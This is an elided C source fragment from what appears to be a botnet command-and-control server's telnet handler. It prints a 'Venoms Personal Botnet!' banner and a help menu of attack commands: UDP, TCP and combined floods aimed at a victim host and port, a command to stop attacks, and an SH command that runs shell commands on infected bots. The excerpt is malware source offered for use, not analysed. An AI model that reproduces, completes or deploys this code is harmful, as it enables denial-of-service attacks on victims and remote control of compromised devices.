...
void *telnetWorker(void *sock)
{
	...
	pthread_create(&title, NULL, &titleWriter, sock);
        ...
        if(send(thefd, "\x1b[36m*        IF THIS ISN'T UR NET          *\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[36m*     TURN BACK NOW FAIR WARNING       *\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[36m****************************************\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
	...
	fak:
        pthread_create(&title, NULL, &titleWriter, sock);
        if(send(thefd, "\x1b[36m****************************************\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[36m*        Venoms Personal Botnet!       *\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[36m*    Fuck the feds, fuck the police!   *\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[36m****************************************\r\n", 48, MSG_NOSIGNAL) == -1) goto end;
		pthread_create(&title, NULL, &titleWriter, sock);
	...
	if(strstr(buf, "!* HELP")) 
        {  
   	  sprintf(botnet, "[+]Attack commands[+]\r\n", clientsConnected(), managesConnected);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        } 
	if(strstr(buf, "!* HELP")) 
        {  
   	  sprintf(botnet, "!* UDP Victim Port Time 32 0 10 - UDP Attacker\r\n", clientsConnected(), managesConnected);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	}  
	if(strstr(buf, "!* HELP")) 
        {  
   	  sprintf(botnet, "!* TCP Victim Port Time 32 all 0 10 - TCP Attacker\r\n", clientsConnected(), managesConnected);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	}  
	if(strstr(buf, "!* HELP")) 
        {  
   	  sprintf(botnet, "!* COMBO Victim Port Time 32 all 0 10 - TCP/UDP Attacker\r\n", clientsConnected(), managesConnected);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	} 
	if(strstr(buf, "!* HELP")) 
        {
   	  sprintf(botnet, "!* KILLATTK - Kills all the on going attacks\r\n", clientsConnected(), managesConnected);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
	if(strstr(buf, "!* HELP")) 
        {  
	...
	if(strstr(buf, "!* HELP")) 
        {  
	  sprintf(botnet, "[+]Global commands[+]\r\n", clientsConnected(), managesConnected);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
	if(strstr(buf, "!* HELP")) 
        { 
	  sprintf(botnet, "!* SH - Executes a shell command\r\n", clientsConnected(), managesConnected);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
	if(strstr(buf, "!* HELP")) 
        {
	  sprintf(botnet, "!* BOTS - Shows the bot count\r\n", clientsConnected(), managesConnected);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
	if(strstr(buf, "!* HELP")) 
        {
	  sprintf(botnet, "!* STATUS - Shows the device count\r\n", clientsConnected(), managesConnected);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        } 
                trim(buf);
